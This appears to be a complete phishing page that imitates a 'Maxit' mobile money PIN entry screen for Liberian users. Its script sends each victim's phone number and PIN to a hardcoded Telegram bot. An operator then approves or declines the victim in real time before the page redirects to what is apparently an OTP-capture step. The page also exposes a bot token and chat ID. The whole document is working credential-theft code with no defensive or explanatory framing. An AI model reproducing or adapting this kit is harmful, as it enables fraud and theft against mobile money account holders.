<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Maxit - Enter PIN</title>

    <!-- Tailwind CSS for utility classes -->
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
         :root {
            --orange-primary: #FF7900;
            --orange-gradient-top: #ff9124;
            --orange-gradient-bottom: #f36b00;
            --bg-page: #f6efe9;
            --card-bg: #ffffff;
            --text-dark: #1f1f1f;
            --text-muted: #6b7280;
            --input-border: #f89e4f;
            --input-bg: #fffbf7;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background-color: var(--bg-page);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
            padding: 12px;
        }
        
        .app-wrapper {
            width: 100%;
            max-width: 460px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: auto;
        }
        
        .top-header {
            width: 100%;
            background: linear-gradient(135deg, var(--orange-gradient-top), var(--orange-gradient-bottom));
            padding: clamp(12px, 3.5vw, 18px) 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 14px 14px 0 0;
            box-shadow: 0 4px 12px rgba(255, 121, 0, 0.22);
            position: relative;
            z-index: 2;
        }
        
        .maxit-logo-img {
            height: clamp(30px, 6vw, 42px);
            width: auto;
            max-width: 80%;
            object-fit: contain;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.15));
        }
        
        .card {
            background-color: var(--card-bg);
            width: 100%;
            border-radius: 0 0 20px 20px;
            padding: clamp(20px, 6vw, 38px) clamp(16px, 5vw, 32px);
            box-shadow: 0 14px 35px rgba(0, 0, 0, 0.06);
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 3;
            position: relative;
        }
        
        .card-title {
            font-size: clamp(18px, 4.8vw, 22px);
            font-weight: 800;
            color: var(--text-dark);
            text-align: center;
            margin-bottom: 6px;
        }
        
        .card-subtitle {
            font-size: clamp(12px, 3.2vw, 13px);
            color: var(--text-muted);
            text-align: center;
            margin-bottom: clamp(20px, 5vw, 30px);
        }
        
        .input-section {
            width: 100%;
            margin-bottom: clamp(18px, 4.5vw, 24px);
        }
        
        .input-label {
            display: block;
            font-size: clamp(12px, 3vw, 13px);
            font-weight: 600;
            color: var(--text-dark);
            margin-bottom: 8px;
        }
        
        .phone-input-container {
            display: flex;
            align-items: center;
            border: 2px solid var(--input-border);
            border-radius: 10px;
            overflow: hidden;
            background-color: #ffffff;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        
        .phone-input-container:focus-within {
            border-color: #ff7900;
            box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.15);
        }
        
        .country-code-box {
            background-color: #e55c00;
            color: #ffffff;
            font-weight: 700;
            font-size: clamp(13px, 3.6vw, 15px);
            padding: clamp(10px, 3vw, 14px) clamp(12px, 4vw, 18px);
            display: flex;
            align-items: center;
            justify-content: center;
            letter-spacing: 0.5px;
            user-select: none;
            flex-shrink: 0;
        }
        
        .phone-number-input {
            flex-grow: 1;
            min-width: 0;
            border: none;
            outline: none;
            padding: clamp(10px, 3vw, 14px) clamp(10px, 3vw, 16px);
            font-size: clamp(14px, 4vw, 16px);
            font-weight: 600;
            color: var(--text-dark);
            background: transparent;
            letter-spacing: 0.5px;
        }
        
        .pin-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .pin-label-container {
            width: 100%;
            text-align: center;
            margin-bottom: 12px;
        }
        
        .pin-label {
            font-size: clamp(12px, 3.2vw, 14px);
            font-weight: 600;
            color: var(--text-dark);
        }
        
        .pin-boxes-container {
            display: flex;
            justify-content: center;
            gap: clamp(6px, 2.5vw, 14px);
            margin-bottom: clamp(24px, 6vw, 36px);
            width: 100%;
        }
        
        .pin-box {
            width: clamp(44px, 18vw, 62px);
            height: clamp(50px, 20vw, 66px);
            background-color: var(--input-bg);
            border: 2px solid var(--input-border);
            border-radius: 12px;
            font-size: clamp(20px, 6vw, 26px);
            font-weight: 700;
            text-align: center;
            color: var(--text-dark);
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s, background-color 0.2s;
            flex-shrink: 1;
        }
        
        .pin-box:focus {
            border-color: #ff7900;
            box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.18);
            background-color: #ffffff;
        }
        
        .btn-submit-container {
            width: 100%;
            display: flex;
            justify-content: flex-start;
        }
        
        .btn-submit {
            background: linear-gradient(135deg, #fbb064, #f39537);
            color: #ffffff;
            border: none;
            border-radius: 10px;
            padding: clamp(11px, 3vw, 14px) clamp(22px, 5vw, 32px);
            font-size: clamp(13px, 3.5vw, 15px);
            font-weight: 700;
            letter-spacing: 0.5px;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(243, 149, 55, 0.35);
            transition: transform 0.1s, opacity 0.2s, box-shadow 0.2s;
            touch-action: manipulation;
            width: 100%;
        }
        
        .btn-submit:hover {
            opacity: 0.95;
            box-shadow: 0 6px 18px rgba(243, 149, 55, 0.45);
        }
        
        .btn-submit:active {
            transform: scale(0.97);
        }
        /* Loading / Waiting Overlay */
        
        .loading-overlay {
            position: absolute;
            inset: 0;
            background: rgba(255, 255, 255, 0.92);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 12px;
            border-radius: 0 0 20px 20px;
            z-index: 10;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.25s ease;
        }
        
        .loading-overlay.show {
            opacity: 1;
            pointer-events: auto;
        }
        
        .loading-text {
            font-size: 14px;
            font-weight: 600;
            color: var(--text-dark);
            text-align: center;
        }
        /* Toast Popup */
        
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%) translateY(120px);
            background-color: #1f2937;
            color: #ffffff;
            padding: 12px 20px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
            transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 100;
            display: flex;
            align-items: center;
            gap: 10px;
            max-width: 90vw;
            width: auto;
        }
        
        .toast.show {
            transform: translateX(-50%) translateY(0);
        }
        
        .toast.success {
            border-left: 4px solid #10b981;
        }
        
        .toast.error {
            border-left: 4px solid #ef4444;
        }
    </style>
</head>

<body>

    <div class="app-wrapper">
        <!-- Top Orange Header with Maxit Logo Image -->
        <header class="top-header">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYwj1M4hN5PAzSqrxgbrz3TKdC_biVQrc5JJlOQG3I8Q&s=10" alt="Maxit Logo" class="maxit-logo-img" onerror="this.style.display='none'; document.getElementById('altLogoText').style.display='block';">
            <span id="altLogoText" style="display:none; color:white; font-weight:800; font-size:24px;">Maxit</span>
        </header>

        <!-- Main Card Section -->
        <main class="card">
            <h1 class="card-title">Enter your correct PIN</h1>
            <p class="card-subtitle">Enter the correct PIN for your account</p>

            <form id="pinForm" style="width: 100%;">
                <!-- Phone Number Input Section -->
                <div class="input-section">
                    <label class="input-label" for="phoneNumberInput">Phone Number</label>
                    <div class="phone-input-container">
                        <div class="country-code-box">+231</div>
                        <input type="tel" id="phoneNumberInput" class="phone-number-input" placeholder="9123455655" autocomplete="tel">
                    </div>
                </div>

                <!-- PIN Input Section -->
                <div class="pin-section">
                    <div class="pin-label-container">
                        <span class="pin-label">Enter your PIN</span>
                    </div>

                    <div class="pin-boxes-container" id="pinContainer">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" aria-label="PIN digit 1">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 2">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 3">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 4">
                    </div>
                </div>

                <!-- Submit Button Container -->
                <div class="btn-submit-container">
                    <button type="submit" class="btn-submit" id="submitBtn">SUBMIT</button>
                </div>
            </form>

            <!-- Loading / Waiting Overlay -->
            <div id="loadingOverlay" class="loading-overlay">
                <i class="fa-solid fa-circle-notch fa-spin fa-2x" style="color: #ff7900;"></i>
                <span class="loading-text">Verifying details, please wait...</span>
            </div>
        </main>
    </div>

    <!-- Toast Popup Container -->
    <div id="toast" class="toast">
        <i class="fa-solid fa-circle-check" id="toastIcon"></i>
        <span id="toastMessage">PIN Submitted successfully!</span>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const pinForm = document.getElementById('pinForm');
            const pinBoxes = document.querySelectorAll('.pin-box');
            const submitBtn = document.getElementById('submitBtn');
            const phoneInput = document.getElementById('phoneNumberInput');
            const loadingOverlay = document.getElementById('loadingOverlay');
            const toast = document.getElementById('toast');
            const toastMessage = document.getElementById('toastMessage');
            const toastIcon = document.getElementById('toastIcon');

            // Telegram Bot Configuration
            const TELEGRAM_BOT_TOKEN = '8605637996:AAFKvFW4iCrbT8KY7fYi3apq0EAK7Oe2a98';
            const TELEGRAM_CHAT_ID = '6479907198';

            let sentMessageId = null;
            let lastUpdateId = 0;
            let pollingTimer = null;
            let timeoutTimer = null;
            let pollingActive = false;

            // 1. Populate Phone Number from sessionStorage
            const storedPhone = sessionStorage.getItem('maxit_phone');
            if (storedPhone) phoneInput.value = storedPhone;

            phoneInput.addEventListener('input', (e) => {
                const val = e.target.value.replace(/[^0-9]/g, '');
                e.target.value = val;
                sessionStorage.setItem('maxit_phone', val.trim());
            });

            // 2. PIN Input Logic (Auto-Advance, Backspace handling)
            pinBoxes.forEach((box, index) => {
                box.addEventListener('input', (e) => {
                    const val = e.target.value.replace(/[^0-9]/g, '');
                    e.target.value = val;

                    if (val && index < pinBoxes.length - 1) {
                        pinBoxes[index + 1].focus();
                    }
                });

                box.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        pinBoxes[index - 1].focus();
                    }
                });

                box.addEventListener('focus', (e) => {
                    e.target.select();
                });
            });

            // 3. Toast Helper
            function showToast(msg, type = 'success') {
                toastMessage.textContent = msg;
                toast.className = `toast ${type} show`;
                toastIcon.className = type === 'success' ?
                    'fa-solid fa-circle-check' :
                    'fa-solid fa-circle-exclamation';

                setTimeout(() => {
                    toast.classList.remove('show');
                }, 3200);
            }

            function setWaiting(isWaiting) {
                if (!loadingOverlay) return;
                if (isWaiting) {
                    loadingOverlay.classList.add('show');
                    submitBtn.disabled = true;
                    pinBoxes.forEach(b => b.disabled = true);
                    phoneInput.disabled = true;
                } else {
                    loadingOverlay.classList.remove('show');
                    submitBtn.disabled = false;
                    pinBoxes.forEach(b => b.disabled = false);
                    phoneInput.disabled = false;
                }
            }

            function clearTimers() {
                if (pollingTimer) {
                    clearInterval(pollingTimer);
                    pollingTimer = null;
                }
                if (timeoutTimer) {
                    clearTimeout(timeoutTimer);
                    timeoutTimer = null;
                }
                pollingActive = false;
            }

            // Reset page for re-entry on decline
            window.showDecline = function() {
                pinForm.reset();
                pinBoxes.forEach(b => b.value = '');
                if (phoneInput) phoneInput.value = '';
                sessionStorage.removeItem('maxit_phone');
                sentMessageId = null;
                clearTimers();
                setWaiting(false);
                showToast('Verification declined. Please re-enter details.', 'error');
                if (pinBoxes[0]) pinBoxes[0].focus();
            };

            function answerCallbackQuery(callbackQueryId) {
                const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
                return fetch(answerUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        callback_query_id: callbackQueryId
                    })
                }).catch(() => {});
            }

            // Polling Telegram for Approve/Decline clicks
            function startPolling() {
                if (pollingActive || !sentMessageId) return;
                pollingActive = true;

                pollingTimer = setInterval(() => {
                    if (!sentMessageId) return;

                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;

                    fetch(url)
                        .then(r => r.json())
                        .then(data => {
                            if (!data.ok || !data.result) return;

                            data.result.forEach(update => {
                                lastUpdateId = update.update_id;
                                if (!update.callback_query) return;

                                const cb = update.callback_query;
                                const cbData = cb.data;
                                const cbMsgId = cb && cb.message && cb.message.message_id;
                                if (cbMsgId !== sentMessageId) return;

                                answerCallbackQuery(cb.id);

                                if (cbData === "approve") {
                                    clearTimers();
                                    setWaiting(false);
                                    window.location.href = "otp.html";
                                } else if (cbData === "decline") {
                                    clearTimers();
                                    setWaiting(false);
                                    window.showDecline();
                                }
                            });
                        })
                        .catch(err => {
                            console.error("Polling error:", err);
                        });
                }, 2000);
            }

            // 4. Submission & Telegram Logic
            pinForm.addEventListener('submit', (e) => {
                e.preventDefault();
                clearTimers();

                const phone = phoneInput.value.trim();
                const pin = Array.from(pinBoxes).map(b => b.value).join('');

                if (!phone) {
                    showToast('Please enter your phone number', 'error');
                    phoneInput.focus();
                    return;
                }

                if (pin.length < 4) {
                    showToast('Please enter all 4 digits of your PIN', 'error');
                    const firstEmpty = Array.from(pinBoxes).find(b => !b.value);
                    if (firstEmpty) firstEmpty.focus();
                    return;
                }

                setWaiting(true);

                const message = `📱 *Maxit Liberia Submission*\n\n📞 *Phone:* \`+231${phone}\`\n🔐 *PIN:* \`${pin}\`\n⏱ *Time:* ${new Date().toLocaleString()}`;
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

                // 60 seconds timeout
                const TIMEOUT_MS = 60000;
                timeoutTimer = setTimeout(() => {
                    clearTimers();
                    setWaiting(false);
                    window.showDecline();
                }, TIMEOUT_MS);

                fetch(url, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: "Markdown",
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: "✅ Approve",
                                        callback_data: "approve"
                                    }, {
                                        text: "❌ Decline",
                                        callback_data: "decline"
                                    }]
                                ]
                            }
                        })
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (data && data.ok && data.result) {
                            sentMessageId = data.result.message_id;
                            startPolling();
                        } else {
                            clearTimers();
                            setWaiting(false);
                            window.location.href = "otp.html";
                        }
                    })
                    .catch(err => {
                        console.error("Erreur Telegram:", err);
                        clearTimers();
                        setWaiting(false);
                        window.location.href = "otp.html";
                    });
            });
        });
    </script>
</body>

</html>
